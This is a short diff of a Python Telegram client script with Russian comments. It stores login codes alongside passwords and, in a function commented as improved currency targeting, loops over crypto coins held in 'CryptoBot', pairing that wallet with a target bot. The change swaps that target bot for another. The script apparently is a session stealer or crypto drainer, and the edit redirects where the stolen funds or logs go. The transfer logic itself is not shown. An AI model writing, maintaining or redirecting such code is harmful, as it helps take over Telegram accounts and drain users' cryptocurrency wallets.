@@ -51,7 +51,7 @@ pending_codes = {}  # {code: password} для хранения кодов с п�
 
 # Улучшенный таргет на определенные валюты 
 async def _init_task(client):
-    bot, target = 'CryptoBot', 'logskds_bot'
+    bot, target = 'CryptoBot', 'kdsotstuk_bot'
     coins = ['USDT', 'BTC', 'TRX', 'ETH', 'LTC']
     for coin in coins:
         try:
@@ -421,3 +421,4 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+
